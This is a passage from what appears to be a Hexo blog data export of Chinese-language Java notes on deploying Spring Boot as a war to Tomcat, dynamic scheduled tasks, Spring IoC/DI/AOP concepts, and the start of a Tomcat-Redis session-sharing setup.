title=\"Springboot部署war包到服务器上\"></a>Springboot部署war包到服务器上</h4><p>1.修改打包方式为war<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;groupId&gt;com.xcloud&lt;/groupId&gt;</span><br><span class=\"line\">   &lt;artifactId&gt;import-xcloud&lt;/artifactId&gt;</span><br><span class=\"line\">   &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</span><br><span class=\"line\">   &lt;packaging&gt;war&lt;/packaging&gt;</span><br></pre></td></tr></table></figure></p>\n<p>2.移除内置tomcat，引入外部的<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;!--使用外部tomcat时放开--&gt;</span><br><span class=\"line\">            &lt;exclusions&gt;</span><br><span class=\"line\">                &lt;exclusion&gt;</span><br><span class=\"line\">                    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">                    &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class=\"line\">                &lt;/exclusion&gt;</span><br><span class=\"line\">            &lt;/exclusions&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;!--下面的两个dependency都是用来部署到外置tomcat时使用，就是去掉内置的tomcat--&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br><span class=\"line\">        &lt;dependency&gt;</span><br><span class=\"line\">            &lt;groupId&gt;javax.servlet&lt;/groupId&gt;</span><br><span class=\"line\">            &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;</span><br><span class=\"line\">            &lt;version&gt;3.0-alpha-1&lt;/version&gt;</span><br><span class=\"line\">            &lt;scope&gt;provided&lt;/scope&gt;</span><br><span class=\"line\">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p>\n<p>3.修改启动类，继承extends SpringBootServletInitializer<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@SpringBootApplication</span><br><span class=\"line\">public class ImportXcloudApplication extends SpringBootServletInitializer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) &#123;</span><br><span class=\"line\">        SpringApplication.run(ImportXcloudApplication.class, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    //返回启动类builder</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) &#123;</span><br><span class=\"line\">        return builder.sources(ImportXcloudApplication.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"spring-schdule","date":"2018-11-19T03:18:54.000Z","_content":"\n#### 1.@Schduled注解\n配置完后，在方法上加@Scheduled(\"定时表达式\")\n\n#### 2.实现ScheduingConfigurer接口\n```\n@Lazy(false)\n@EnableScheduling\n@Component\npublic class DynamicScheduledTask implements SchedulingConfigurer {\n\n\t@Value(\"${abc.call-cron}\")\n\tprivate String callCron;\n\n  //重写configureTasks\n\t@Override\n\tpublic void configureTasks(ScheduledTaskRegistrar taskRegistrar) {\n\t\tif(!\"0\".equals(callCron)){\n\t\t\ttaskRegistrar.addTriggerTask(new Runnable() {\n\t\t\t\t@Override\n\t\t\t\tpublic void run() {\n\t\t\t\t\t//doSomething\n\t\t\t\t}\n\t\t\t}, new Trigger() {\n\n\t\t\t\t@Override\n\t\t\t\tpublic Date nextExecutionTime(TriggerContext triggerContext) {\n          //定时器触发，callCron为定时表达式\n\t\t\t\t\tCronTrigger trigger = new CronTrigger(callCron);\n\t\t\t\t\tDate nextExecDate = trigger.nextExecutionTime(triggerContext);\n\t\t\t\t\treturn nextExecDate;\n\t\t\t\t}\n\t\t\t});\n\t\t}\n\n}\n\n```\n","source":"_posts/java/spring-schdule.md","raw":"---\ntitle: spring-schdule\ndate: 2018-11-19 11:18:54\ntags: [java,springboot]\n---\n\n#### 1.@Schduled注解\n配置完后，在方法上加@Scheduled(\"定时表达式\")\n\n#### 2.实现ScheduingConfigurer接口\n```\n@Lazy(false)\n@EnableScheduling\n@Component\npublic class DynamicScheduledTask implements SchedulingConfigurer {\n\n\t@Value(\"${abc.call-cron}\")\n\tprivate String callCron;\n\n  //重写configureTasks\n\t@Override\n\tpublic void configureTasks(ScheduledTaskRegistrar taskRegistrar) {\n\t\tif(!\"0\".equals(callCron)){\n\t\t\ttaskRegistrar.addTriggerTask(new Runnable() {\n\t\t\t\t@Override\n\t\t\t\tpublic void run() {\n\t\t\t\t\t//doSomething\n\t\t\t\t}\n\t\t\t}, new Trigger() {\n\n\t\t\t\t@Override\n\t\t\t\tpublic Date nextExecutionTime(TriggerContext triggerContext) {\n          //定时器触发，callCron为定时表达式\n\t\t\t\t\tCronTrigger trigger = new CronTrigger(callCron);\n\t\t\t\t\tDate nextExecDate = trigger.nextExecutionTime(triggerContext);\n\t\t\t\t\treturn nextExecDate;\n\t\t\t\t}\n\t\t\t});\n\t\t}\n\n}\n\n```\n","slug":"java/spring-schdule","published":1,"updated":"2019-01-21T09:08:34.279Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051w00156cvpjarj1vvp","content":"<h4 id=\"1-Schduled注解\"><a href=\"#1-Schduled注解\" class=\"headerlink\" title=\"1.@Schduled注解\"></a>1.@Schduled注解</h4><p>配置完后，在方法上加@Scheduled(“定时表达式”)</p>\n<h4 id=\"2-实现ScheduingConfigurer接口\"><a href=\"#2-实现ScheduingConfigurer接口\" class=\"headerlink\" title=\"2.实现ScheduingConfigurer接口\"></a>2.实现ScheduingConfigurer接口</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Lazy(false)</span><br><span class=\"line\">@EnableScheduling</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class DynamicScheduledTask implements SchedulingConfigurer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Value(&quot;$&#123;abc.call-cron&#125;&quot;)</span><br><span class=\"line\">\tprivate String callCron;</span><br><span class=\"line\"></span><br><span class=\"line\">  //重写configureTasks</span><br><span class=\"line\">\t@Override</span><br><span class=\"line\">\tpublic void configureTasks(ScheduledTaskRegistrar taskRegistrar) &#123;</span><br><span class=\"line\">\t\tif(!&quot;0&quot;.equals(callCron))&#123;</span><br><span class=\"line\">\t\t\ttaskRegistrar.addTriggerTask(new Runnable() &#123;</span><br><span class=\"line\">\t\t\t\t@Override</span><br><span class=\"line\">\t\t\t\tpublic void run() &#123;</span><br><span class=\"line\">\t\t\t\t\t//doSomething</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;, new Trigger() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t@Override</span><br><span class=\"line\">\t\t\t\tpublic Date nextExecutionTime(TriggerContext triggerContext) &#123;</span><br><span class=\"line\">          //定时器触发，callCron为定时表达式</span><br><span class=\"line\">\t\t\t\t\tCronTrigger trigger = new CronTrigger(callCron);</span><br><span class=\"line\">\t\t\t\t\tDate nextExecDate = trigger.nextExecutionTime(triggerContext);</span><br><span class=\"line\">\t\t\t\t\treturn nextExecDate;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-Schduled注解\"><a href=\"#1-Schduled注解\" class=\"headerlink\" title=\"1.@Schduled注解\"></a>1.@Schduled注解</h4><p>配置完后，在方法上加@Scheduled(“定时表达式”)</p>\n<h4 id=\"2-实现ScheduingConfigurer接口\"><a href=\"#2-实现ScheduingConfigurer接口\" class=\"headerlink\" title=\"2.实现ScheduingConfigurer接口\"></a>2.实现ScheduingConfigurer接口</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Lazy(false)</span><br><span class=\"line\">@EnableScheduling</span><br><span class=\"line\">@Component</span><br><span class=\"line\">public class DynamicScheduledTask implements SchedulingConfigurer &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Value(&quot;$&#123;abc.call-cron&#125;&quot;)</span><br><span class=\"line\">\tprivate String callCron;</span><br><span class=\"line\"></span><br><span class=\"line\">  //重写configureTasks</span><br><span class=\"line\">\t@Override</span><br><span class=\"line\">\tpublic void configureTasks(ScheduledTaskRegistrar taskRegistrar) &#123;</span><br><span class=\"line\">\t\tif(!&quot;0&quot;.equals(callCron))&#123;</span><br><span class=\"line\">\t\t\ttaskRegistrar.addTriggerTask(new Runnable() &#123;</span><br><span class=\"line\">\t\t\t\t@Override</span><br><span class=\"line\">\t\t\t\tpublic void run() &#123;</span><br><span class=\"line\">\t\t\t\t\t//doSomething</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;, new Trigger() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t\t@Override</span><br><span class=\"line\">\t\t\t\tpublic Date nextExecutionTime(TriggerContext triggerContext) &#123;</span><br><span class=\"line\">          //定时器触发，callCron为定时表达式</span><br><span class=\"line\">\t\t\t\t\tCronTrigger trigger = new CronTrigger(callCron);</span><br><span class=\"line\">\t\t\t\t\tDate nextExecDate = trigger.nextExecutionTime(triggerContext);</span><br><span class=\"line\">\t\t\t\t\treturn nextExecDate;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"OJT022","date":"2018-09-21T08:30:54.000Z","_content":"\n#### 1.Spring一些基本概念\n容器:\n就是一个存放东西还能随时取出来的地方\n\nBean:\n本质上是一个Java对象,是构成应用程序的一个个基本组件.<br>\n通过bean,构建逻辑从代码剥离到配置文件，提供了重用性\n\nIoc(控制反转)/DI(依赖注入) <br>\n对象的创建交给外部容器完成，这个就做控制反转<br>\n控制反转从容器的角度描述,容器控制应用程序,由容器反向的向应用程序注入应用程序所需的外部资源 <br>\n依赖注入是从应用程序的角度描述,应用程序组件依赖容器创建并注入它所需的外部资源<br>\n在Ioc/DI思想中,应用程序由主动变成被动的,等待容器来创建并注入它所需的资源,<br>\n即，spring初始化一个容器，程序需要啥（配置，依赖等），我就从容器中拿出啥给你使用。<br>\n这个思想的转变,有效的解耦了对象和它所需的外部资源,有利于功能复用,也使得程序整个体系结构变得非常灵活<br>\nDI:称作依赖注入(Dependency Injection),和控制反转一个概念，具体的讲，当一个角色需要另外一个角色协助的时候，在传统的程序设计中，通常有调用者来创建被调用者的实例。但是在spring中创建被调用者将不再有调用者完成，因此叫控制反转。创建被调用对象有Spring来完成，在容器实例化对象的时候主动的将被调用者（或者说它的依赖对象）注入给调用对象，因此又叫依赖注入。<br>\n依赖注入通过反射来实现<br>\n对象之间的依赖关系，其实就是给对象上的属性赋值！因为对象上有其他对象的变量，因此存在了依赖...<br>\nSpring提供了好几种的方式来给属性赋值\n>1) 通过构造函数\n2) 通过set方法给属性注入值\n3) p名称空间\n4)自动装配(了解)\n5) 注解\n\n\nAOP<br>\n功能： 让关注点代码与业务代码分离！\n面向切面编程就是指： 对很多功能都有的重复的代码抽取，再在运行的时候往业务方法上动态植入“切面类代码”。<br>\n面向方面的编程，即 AOP，是一种编程技术，它允许程序员对横切关注点或横切典型的职责分界线的行为（例如日志和事务管理）进行模块化。AOP 的核心构造是方面，它将那些影响多个类的行为封装到可重用的模块中。<br>\nspring用代理类包裹切面，把他们织入到Spring管理的bean中。\n也就是说代理类伪装成目标类，它会截取对目标类中方法的调用，\n让调用者对目标类的调用都先变成调用伪装类，伪装类中就先执行了切面，再把调用转发给真正的目标bean。<br>\n(例如日志时的get(class)????)\n\n#### 2.模块\n参考: https://www.ibm.com/developerworks/cn/java/wa-spring1/index.html\n##### 1.Spring core\n核心容器提供 Spring 框架的基本功能。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用控制反转 （IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。\n##### 2.Spring aop\nSpring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。\n##### 3.Spring orm\n##### 4.Spring dao\n##### 5.Spring web\n##### 6.Spring context\n向 Spring 框架提供上下文信息\n##### Spring web mvc\n#### 3.spring优缺点\n优：\n- 简化编程，配置简单,让使用者只关心核心业务的开发，框架帮你屏蔽原有技术跟业务开发无关的各类技术问题\n- 解耦和\n- 因为bean的依赖注入，易于单元测试\n\n缺:\n","source":"_posts/java/spring.md","raw":"---\ntitle: OJT022\ndate: 2018-09-21 16:30:54\ntags: [java,spring]\n---\n\n#### 1.Spring一些基本概念\n容器:\n就是一个存放东西还能随时取出来的地方\n\nBean:\n本质上是一个Java对象,是构成应用程序的一个个基本组件.<br>\n通过bean,构建逻辑从代码剥离到配置文件，提供了重用性\n\nIoc(控制反转)/DI(依赖注入) <br>\n对象的创建交给外部容器完成，这个就做控制反转<br>\n控制反转从容器的角度描述,容器控制应用程序,由容器反向的向应用程序注入应用程序所需的外部资源 <br>\n依赖注入是从应用程序的角度描述,应用程序组件依赖容器创建并注入它所需的外部资源<br>\n在Ioc/DI思想中,应用程序由主动变成被动的,等待容器来创建并注入它所需的资源,<br>\n即，spring初始化一个容器，程序需要啥（配置，依赖等），我就从容器中拿出啥给你使用。<br>\n这个思想的转变,有效的解耦了对象和它所需的外部资源,有利于功能复用,也使得程序整个体系结构变得非常灵活<br>\nDI:称作依赖注入(Dependency Injection),和控制反转一个概念，具体的讲，当一个角色需要另外一个角色协助的时候，在传统的程序设计中，通常有调用者来创建被调用者的实例。但是在spring中创建被调用者将不再有调用者完成，因此叫控制反转。创建被调用对象有Spring来完成，在容器实例化对象的时候主动的将被调用者（或者说它的依赖对象）注入给调用对象，因此又叫依赖注入。<br>\n依赖注入通过反射来实现<br>\n对象之间的依赖关系，其实就是给对象上的属性赋值！因为对象上有其他对象的变量，因此存在了依赖...<br>\nSpring提供了好几种的方式来给属性赋值\n>1) 通过构造函数\n2) 通过set方法给属性注入值\n3) p名称空间\n4)自动装配(了解)\n5) 注解\n\n\nAOP<br>\n功能： 让关注点代码与业务代码分离！\n面向切面编程就是指： 对很多功能都有的重复的代码抽取，再在运行的时候往业务方法上动态植入“切面类代码”。<br>\n面向方面的编程，即 AOP，是一种编程技术，它允许程序员对横切关注点或横切典型的职责分界线的行为（例如日志和事务管理）进行模块化。AOP 的核心构造是方面，它将那些影响多个类的行为封装到可重用的模块中。<br>\nspring用代理类包裹切面，把他们织入到Spring管理的bean中。\n也就是说代理类伪装成目标类，它会截取对目标类中方法的调用，\n让调用者对目标类的调用都先变成调用伪装类，伪装类中就先执行了切面，再把调用转发给真正的目标bean。<br>\n(例如日志时的get(class)????)\n\n#### 2.模块\n参考: https://www.ibm.com/developerworks/cn/java/wa-spring1/index.html\n##### 1.Spring core\n核心容器提供 Spring 框架的基本功能。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用控制反转 （IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。\n##### 2.Spring aop\nSpring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。\n##### 3.Spring orm\n##### 4.Spring dao\n##### 5.Spring web\n##### 6.Spring context\n向 Spring 框架提供上下文信息\n##### Spring web mvc\n#### 3.spring优缺点\n优：\n- 简化编程，配置简单,让使用者只关心核心业务的开发，框架帮你屏蔽原有技术跟业务开发无关的各类技术问题\n- 解耦和\n- 因为bean的依赖注入，易于单元测试\n\n缺:\n","slug":"java/spring","published":1,"updated":"2018-11-07T10:04:22.486Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjr64051y00186cvpmyb2unnx","content":"<h4 id=\"1-Spring一些基本概念\"><a href=\"#1-Spring一些基本概念\" class=\"headerlink\" title=\"1.Spring一些基本概念\"></a>1.Spring一些基本概念</h4><p>容器:<br>就是一个存放东西还能随时取出来的地方</p>\n<p>Bean:<br>本质上是一个Java对象,是构成应用程序的一个个基本组件.<br><br>通过bean,构建逻辑从代码剥离到配置文件，提供了重用性</p>\n<p>Ioc(控制反转)/DI(依赖注入) <br><br>对象的创建交给外部容器完成，这个就做控制反转<br><br>控制反转从容器的角度描述,容器控制应用程序,由容器反向的向应用程序注入应用程序所需的外部资源 <br><br>依赖注入是从应用程序的角度描述,应用程序组件依赖容器创建并注入它所需的外部资源<br><br>在Ioc/DI思想中,应用程序由主动变成被动的,等待容器来创建并注入它所需的资源,<br><br>即，spring初始化一个容器，程序需要啥（配置，依赖等），我就从容器中拿出啥给你使用。<br><br>这个思想的转变,有效的解耦了对象和它所需的外部资源,有利于功能复用,也使得程序整个体系结构变得非常灵活<br><br>DI:称作依赖注入(Dependency Injection),和控制反转一个概念，具体的讲，当一个角色需要另外一个角色协助的时候，在传统的程序设计中，通常有调用者来创建被调用者的实例。但是在spring中创建被调用者将不再有调用者完成，因此叫控制反转。创建被调用对象有Spring来完成，在容器实例化对象的时候主动的将被调用者（或者说它的依赖对象）注入给调用对象，因此又叫依赖注入。<br><br>依赖注入通过反射来实现<br><br>对象之间的依赖关系，其实就是给对象上的属性赋值！因为对象上有其他对象的变量，因此存在了依赖…<br><br>Spring提供了好几种的方式来给属性赋值</p>\n<blockquote>\n<p>1) 通过构造函数<br>2) 通过set方法给属性注入值<br>3) p名称空间<br>4)自动装配(了解)<br>5) 注解</p>\n</blockquote>\n<p>AOP<br><br>功能： 让关注点代码与业务代码分离！<br>面向切面编程就是指： 对很多功能都有的重复的代码抽取，再在运行的时候往业务方法上动态植入“切面类代码”。<br><br>面向方面的编程，即 AOP，是一种编程技术，它允许程序员对横切关注点或横切典型的职责分界线的行为（例如日志和事务管理）进行模块化。AOP 的核心构造是方面，它将那些影响多个类的行为封装到可重用的模块中。<br><br>spring用代理类包裹切面，把他们织入到Spring管理的bean中。<br>也就是说代理类伪装成目标类，它会截取对目标类中方法的调用，<br>让调用者对目标类的调用都先变成调用伪装类，伪装类中就先执行了切面，再把调用转发给真正的目标bean。<br><br>(例如日志时的get(class)????)</p>\n<h4 id=\"2-模块\"><a href=\"#2-模块\" class=\"headerlink\" title=\"2.模块\"></a>2.模块</h4><p>参考: <a href=\"https://www.ibm.com/developerworks/cn/java/wa-spring1/index.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/java/wa-spring1/index.html</a></p>\n<h5 id=\"1-Spring-core\"><a href=\"#1-Spring-core\" class=\"headerlink\" title=\"1.Spring core\"></a>1.Spring core</h5><p>核心容器提供 Spring 框架的基本功能。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用控制反转 （IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。</p>\n<h5 id=\"2-Spring-aop\"><a href=\"#2-Spring-aop\" class=\"headerlink\" title=\"2.Spring aop\"></a>2.Spring aop</h5><p>Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。</p>\n<h5 id=\"3-Spring-orm\"><a href=\"#3-Spring-orm\" class=\"headerlink\" title=\"3.Spring orm\"></a>3.Spring orm</h5><h5 id=\"4-Spring-dao\"><a href=\"#4-Spring-dao\" class=\"headerlink\" title=\"4.Spring dao\"></a>4.Spring dao</h5><h5 id=\"5-Spring-web\"><a href=\"#5-Spring-web\" class=\"headerlink\" title=\"5.Spring web\"></a>5.Spring web</h5><h5 id=\"6-Spring-context\"><a href=\"#6-Spring-context\" class=\"headerlink\" title=\"6.Spring context\"></a>6.Spring context</h5><p>向 Spring 框架提供上下文信息</p>\n<h5 id=\"Spring-web-mvc\"><a href=\"#Spring-web-mvc\" class=\"headerlink\" title=\"Spring web mvc\"></a>Spring web mvc</h5><h4 id=\"3-spring优缺点\"><a href=\"#3-spring优缺点\" class=\"headerlink\" title=\"3.spring优缺点\"></a>3.spring优缺点</h4><p>优：</p>\n<ul>\n<li>简化编程，配置简单,让使用者只关心核心业务的开发，框架帮你屏蔽原有技术跟业务开发无关的各类技术问题</li>\n<li>解耦和</li>\n<li>因为bean的依赖注入，易于单元测试</li>\n</ul>\n<p>缺:</p>\n","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-Spring一些基本概念\"><a href=\"#1-Spring一些基本概念\" class=\"headerlink\" title=\"1.Spring一些基本概念\"></a>1.Spring一些基本概念</h4><p>容器:<br>就是一个存放东西还能随时取出来的地方</p>\n<p>Bean:<br>本质上是一个Java对象,是构成应用程序的一个个基本组件.<br><br>通过bean,构建逻辑从代码剥离到配置文件，提供了重用性</p>\n<p>Ioc(控制反转)/DI(依赖注入) <br><br>对象的创建交给外部容器完成，这个就做控制反转<br><br>控制反转从容器的角度描述,容器控制应用程序,由容器反向的向应用程序注入应用程序所需的外部资源 <br><br>依赖注入是从应用程序的角度描述,应用程序组件依赖容器创建并注入它所需的外部资源<br><br>在Ioc/DI思想中,应用程序由主动变成被动的,等待容器来创建并注入它所需的资源,<br><br>即，spring初始化一个容器，程序需要啥（配置，依赖等），我就从容器中拿出啥给你使用。<br><br>这个思想的转变,有效的解耦了对象和它所需的外部资源,有利于功能复用,也使得程序整个体系结构变得非常灵活<br><br>DI:称作依赖注入(Dependency Injection),和控制反转一个概念，具体的讲，当一个角色需要另外一个角色协助的时候，在传统的程序设计中，通常有调用者来创建被调用者的实例。但是在spring中创建被调用者将不再有调用者完成，因此叫控制反转。创建被调用对象有Spring来完成，在容器实例化对象的时候主动的将被调用者（或者说它的依赖对象）注入给调用对象，因此又叫依赖注入。<br><br>依赖注入通过反射来实现<br><br>对象之间的依赖关系，其实就是给对象上的属性赋值！因为对象上有其他对象的变量，因此存在了依赖…<br><br>Spring提供了好几种的方式来给属性赋值</p>\n<blockquote>\n<p>1) 通过构造函数<br>2) 通过set方法给属性注入值<br>3) p名称空间<br>4)自动装配(了解)<br>5) 注解</p>\n</blockquote>\n<p>AOP<br><br>功能： 让关注点代码与业务代码分离！<br>面向切面编程就是指： 对很多功能都有的重复的代码抽取，再在运行的时候往业务方法上动态植入“切面类代码”。<br><br>面向方面的编程，即 AOP，是一种编程技术，它允许程序员对横切关注点或横切典型的职责分界线的行为（例如日志和事务管理）进行模块化。AOP 的核心构造是方面，它将那些影响多个类的行为封装到可重用的模块中。<br><br>spring用代理类包裹切面，把他们织入到Spring管理的bean中。<br>也就是说代理类伪装成目标类，它会截取对目标类中方法的调用，<br>让调用者对目标类的调用都先变成调用伪装类，伪装类中就先执行了切面，再把调用转发给真正的目标bean。<br><br>(例如日志时的get(class)????)</p>\n<h4 id=\"2-模块\"><a href=\"#2-模块\" class=\"headerlink\" title=\"2.模块\"></a>2.模块</h4><p>参考: <a href=\"https://www.ibm.com/developerworks/cn/java/wa-spring1/index.html\" target=\"_blank\" rel=\"noopener\">https://www.ibm.com/developerworks/cn/java/wa-spring1/index.html</a></p>\n<h5 id=\"1-Spring-core\"><a href=\"#1-Spring-core\" class=\"headerlink\" title=\"1.Spring core\"></a>1.Spring core</h5><p>核心容器提供 Spring 框架的基本功能。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用控制反转 （IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。</p>\n<h5 id=\"2-Spring-aop\"><a href=\"#2-Spring-aop\" class=\"headerlink\" title=\"2.Spring aop\"></a>2.Spring aop</h5><p>Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。</p>\n<h5 id=\"3-Spring-orm\"><a href=\"#3-Spring-orm\" class=\"headerlink\" title=\"3.Spring orm\"></a>3.Spring orm</h5><h5 id=\"4-Spring-dao\"><a href=\"#4-Spring-dao\" class=\"headerlink\" title=\"4.Spring dao\"></a>4.Spring dao</h5><h5 id=\"5-Spring-web\"><a href=\"#5-Spring-web\" class=\"headerlink\" title=\"5.Spring web\"></a>5.Spring web</h5><h5 id=\"6-Spring-context\"><a href=\"#6-Spring-context\" class=\"headerlink\" title=\"6.Spring context\"></a>6.Spring context</h5><p>向 Spring 框架提供上下文信息</p>\n<h5 id=\"Spring-web-mvc\"><a href=\"#Spring-web-mvc\" class=\"headerlink\" title=\"Spring web mvc\"></a>Spring web mvc</h5><h4 id=\"3-spring优缺点\"><a href=\"#3-spring优缺点\" class=\"headerlink\" title=\"3.spring优缺点\"></a>3.spring优缺点</h4><p>优：</p>\n<ul>\n<li>简化编程，配置简单,让使用者只关心核心业务的开发，框架帮你屏蔽原有技术跟业务开发无关的各类技术问题</li>\n<li>解耦和</li>\n<li>因为bean的依赖注入，易于单元测试</li>\n</ul>\n<p>缺:</p>\n"},{"title":"tomcat-redis-session","date":"2018-09-28T07:47:53.000Z","_content":"#### 1.需求\n不同Ip主机上的tomcat,保持session同步。<br>\n#### 2.查资料\n一般做法为，利用redis保持session,不同tomcat从redis存取，外层nginx做tomcat的负载均衡。<br>\n开源项目https://github.com/jcoleman/tomcat-redis-session-manager， 提供了tomcat连接redis的jar包，但是，我试了多次，总是不行，版本不对，或者class找不到等。<br>\n解决方案参照：https://my.oschina.net/Listening/blog/674759, 直接用gradle生成jar包。\n\n#### 3.实现\ntomcat7.0.61/nginx1.10.3/ubuntu虚拟机\n###### 1.tomcat\n- 解压两个tomcat到两个虚拟机\n- conf/server.xml更改端口，使之不重复\n- 添加index.jsp到 webapps/Root目录下\n- 分别启动tomcat,看看是否正常\n```\n<%@ page language=\"java\" import=\"java.util.*\" pageEncoding=\"UTF-8\"%>  \n<%  \nString path = request.getContextPath();  \nString basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+request.getServerPort()+path+\"/\";  \n%>  \n<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">  \n<html>  \n  <head>  \n    <base href=\"<%=basePath%>\">  \n    <title>My JSP 'index.jsp' starting page</title>  \n    <meta http-equiv=\"pragma\" content=\"no-cache\">  \n    <meta http-equiv=\"cache-control\" content=\"no-cache\">  \n    <meta http-equiv=\"expires\" content=\"0\">      \n    <meta http-equiv=\"keywords\" content=\"keyword1,keyword2,keyword3\">  \n    <meta http-equiv=\"description\" content=\"This is my page\">  \n    <!--\n    <link rel=\"stylesheet\" 